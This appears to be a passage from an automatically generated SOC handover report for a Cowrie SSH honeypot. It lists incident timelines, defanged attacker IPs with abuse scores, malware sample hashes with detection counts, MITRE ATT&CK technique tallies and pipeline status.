| `2026-05-25 19:41:39` | `cowrie.command.failed` |
| `2026-05-25 19:41:39` | `cowrie.log.closed` |
| `2026-05-25 19:41:41` | `cowrie.session.params` |
| `2026-05-25 19:41:41` | `cowrie.command.input` |
| `2026-05-25 19:41:41` | `cowrie.session.file_download` |
| `2026-05-25 19:41:41` | `cowrie.log.closed` |
| `2026-05-25 19:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7afe9754addd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.44[.]93` |
| **First Seen** | 2026-05-25 19:41 |
| **Last Seen** | 2026-05-25 19:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 19:41:47` | `cowrie.session.connect` |
| `2026-05-25 19:41:47` | `cowrie.client.version` |
| `2026-05-25 19:41:49` | `cowrie.client.kex` |
| `2026-05-25 19:41:50` | `cowrie.login.success` |
| `2026-05-25 19:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.44[.]93` to AbuseIPDB if not already reported
- [ ] Block `120.48.44[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.96.200[.]56` | **21** | 2026-05-25 19:10 | 2026-05-25 19:28 | 28m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `140.246.137[.]102` | **20** | 2026-05-25 19:25 | 2026-05-25 19:35 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.44[.]93` | **5** | 2026-05-25 18:44 | 2026-05-25 19:41 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `45.120.216[.]232` | **3** | 2026-05-25 17:47 | 2026-05-25 19:06 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.98[.]151` | **3** | 2026-05-25 19:00 | 2026-05-25 19:00 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `112.140.187[.]102` | **2** | 2026-05-25 18:22 | 2026-05-25 19:07 | 1m | 0 | `T1592` | 🟢 LOW |
| `190.122.91[.]51` | **2** | 2026-05-25 19:35 | 2026-05-25 19:37 | 4m | 0 | `T1592` | 🟢 LOW |
| `118.145.225[.]50` | 1 | 2026-05-25 19:03 | 2026-05-25 19:03 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.32[.]130` | 1 | 2026-05-25 18:36 | 2026-05-25 18:37 | 64s | 1 | `T1110.001` | 🟢 LOW |
| `180.131.167[.]125` | 1 | 2026-05-25 19:21 | 2026-05-25 19:22 | 40s | 0 | `T1592` | 🟢 LOW |
| `183.232.212[.]207` | 1 | 2026-05-25 18:16 | 2026-05-25 18:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]19` | 1 | 2026-05-25 18:31 | 2026-05-25 18:31 | 9s | 0 | `T1592` | 🟢 LOW |
| `186.31.95[.]163` | 1 | 2026-05-25 19:25 | 2026-05-25 19:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-25 19:26 | 2026-05-25 19:27 | 92s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-05-25 19:21 | 2026-05-25 19:21 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.140.187[.]102` | SG | Asia Pacific Network Information Centre | **100** ⚠️ | 1 |
| `47.251.98[.]151` | US | Alibaba Cloud - US | **100** ⚠️ | 15 |
| `180.131.167[.]125` | HK | PowerCom Network Hong Kong Ltd | **100** ⚠️ | 7 |
| `185.242.226[.]19` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `183.232.212[.]207` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `190.122.91[.]51` | AR | Servicios y Telecomunicaciones S.A. | **100** ⚠️ | 1 |
| `118.145.225[.]50` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `45.120.216[.]232` | HK | Cloud Computing HK Limited | **100** ⚠️ | 50 |
| `120.48.32[.]130` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `120.48.44[.]93` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 84 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 37 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |

---

## 🔕 False Positive Summary (10 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 101 cases |
| Tool 34  | Credential Extractor        | ✅ 67 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 10 filtered (9.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 15 recon entry/entries in table (7 group(s) consolidating 56 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-25T19:46:35Z_
